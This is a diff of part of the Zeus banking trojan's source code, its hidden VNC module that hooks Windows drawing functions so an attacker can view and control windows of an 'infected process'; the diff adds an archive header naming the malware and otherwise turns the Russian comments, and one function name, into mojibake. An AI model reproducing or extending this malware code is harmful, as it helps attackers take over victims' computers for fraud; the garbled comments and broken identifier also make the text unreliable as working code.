@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <wininet.h>
@@ -29,9 +40,9 @@ typedef struct
 }PAINTDATA;
 
 /*
-  Получение текущего PAINDDATA для потока.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PAINDDATA пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return - PAINTDATA, или NULL.
+  Return - PAINTDATA, пїЅпїЅпїЅ NULL.
 */
 static __inline PAINTDATA *getThreadPaintData(void)
 {
@@ -39,7 +50,7 @@ static __inline PAINTDATA *getThreadPaintData(void)
 }
 
 /*
-  Установка PAINTDATA для потока.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PAINTDATA пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN paintData - PAINTDATA.
 */
@@ -64,11 +75,11 @@ static __inline void setThreadPaintData(const PAINTDATA *paintData)
 }
 
 /*
-  Копирование локального квадрата в удалнный квадрат, или наоборот.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN vncProcessData - VNCPROCESSDATA.
-  IN rect           - квадрат назначения.
-  IN toDesktop      - true - локальный в удаленный, false - удаленный в локальный.
+  IN rect           - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN toDesktop      - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect, bool toDesktop)
 {
@@ -92,13 +103,13 @@ static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect
  В Drawing window.
   
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно для печати.
-  IN visibleRect    - видимая область для окна.
-  IN isServer       - true - функция вызвана с сервера,
-                      false - функция вызвана с зараженного процесса.
+  IN window         - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN visibleRect    - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+  IN isServer       - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   
-  Return            - true - окно нарисовано/пропущено,
-                      false - окно не нарисовано.
+  Return            - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer)
 {
@@ -329,7 +340,7 @@ HDC WINAPI VncServer::hookerGetWindowDc(HWND window)
   return CWA(user32, GetWindowDC)(window);
 }
 
-int WINAPI VncServer::hookerReleaseDс(HWND window, HDC dc)
+int WINAPI VncServer::hookerReleaseDпїЅ(HWND window, HDC dc)
 {
   if(IS_VNC_PROCESS)
   {
@@ -389,12 +400,12 @@ int WINAPI VncServer::hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Создания процесса рисования окон.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
 
-  Return                - true - в случаи успеха,
-                          false - в случаи ошибки.
+  Return                - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                          false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool createPaintProcess(VNCPROCESSDATA *vncProcessData)
 {
@@ -450,15 +461,15 @@ bool VncServer::startAsPaintThread(void)
 }
 
 /*
-  Выбор метода рисования окна.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно.
-  IN ownerRect      - кординаты, видимой клиенсткой части родителя.
+  IN window         - пїЅпїЅпїЅпїЅ.
+  IN ownerRect      - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   IN windowInfo     - WINDOWINFO.
 
-  Return            - true - рисовать детей,
-                      false - не рисовать детей.
+  Return            - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+                      false - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *ownerRect, const WINDOWINFO *windowInfo)
 {
